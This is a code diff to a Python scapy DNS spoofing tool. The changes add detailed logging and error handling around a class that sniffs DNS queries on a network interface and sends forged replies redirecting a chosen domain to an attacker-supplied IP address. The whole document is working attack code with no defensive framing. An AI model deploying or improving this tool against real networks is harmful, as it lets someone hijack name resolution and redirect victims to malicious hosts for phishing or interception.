@@ -1,7 +1,4 @@
-import time
-import sys
 import logging
-import os
 from scapy.all import *
 
 
@@ -13,7 +10,19 @@ class DNSSpoofer:
         self.interface = interface
     
     def run(self) -> None:
-        sniff(iface=self.interface, filter="udp port 53", prn=self.dns_spoof)
+        logging.info("DNS spoofing for '{}' -> {} started".format(self.target_domain, self.fake_ip))
+        
+        try:
+            logging.info("Starting listening for DNS queries on port 53")
+            sniff(iface=self.interface, filter="udp port 53", prn=self.dns_spoof)
+        except KeyboardInterrupt:
+            logging.info("DNS spoofing stopped by user")
+        except Exception as e:
+            logging.error(e)
+            return
+            
+        logging.info("DNS spoofing finished")
+        
     
     @staticmethod
     def is_dns_query(pkt):
@@ -24,16 +33,35 @@ class DNSSpoofer:
         return pkt[DNSQR].qname.decode()
     
     @staticmethod
-    def craft_spoofed_DNS_response(self, pkt, fake_ip: str, query_domain: str):
+    def craft_spoofed_DNS_response(pkt, fake_ip: str, query_domain: str):
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=query_domain, ttl=10, rdata=fake_ip))
+                      DNS(id=pkt[DNS].id,
+                          qd=pkt[DNS].qd,
+                          aa=1,
+                          qr=1,
+                          an=DNSRR(rrname=query_domain, ttl=10, rdata=fake_ip))
         return spoofed_pkt
     
     def dns_spoof(self, pkt):
+        logging.info("Packet received")
         if self.is_dns_query(pkt):
+            logging.info("Packet is DNS query")
+            
             query_domain = self.get_DNS_query_domain(pkt)
+            logging.info("Domain in DNS query is '{}'".format(query_domain))
             
             if self.target_domain in query_domain:
+                logging.info("'{}' in DNS query is target domain '{}'".format(query_domain, self.target_domain))
+                
                 spoofed_response = self.craft_spoofed_DNS_response(pkt, self.fake_ip, query_domain)
+                logging.info("Spoofed DNS response crafted")
+                
+                logging.info("Spoofed DNS response sending via interface '{}'".format(self.interface))
                 send(spoofed_response, iface=self.interface, verbose=0)
+                logging.info("Spoofed DNS response sent via interface '{}'".format(self.interface))
+            else:
+                logging.info("'{}' in DNS query is NOT target domain '{}'".format(query_domain, self.target_domain))
+        else:
+            logging.info("Packet is NOT DNS query")
+            
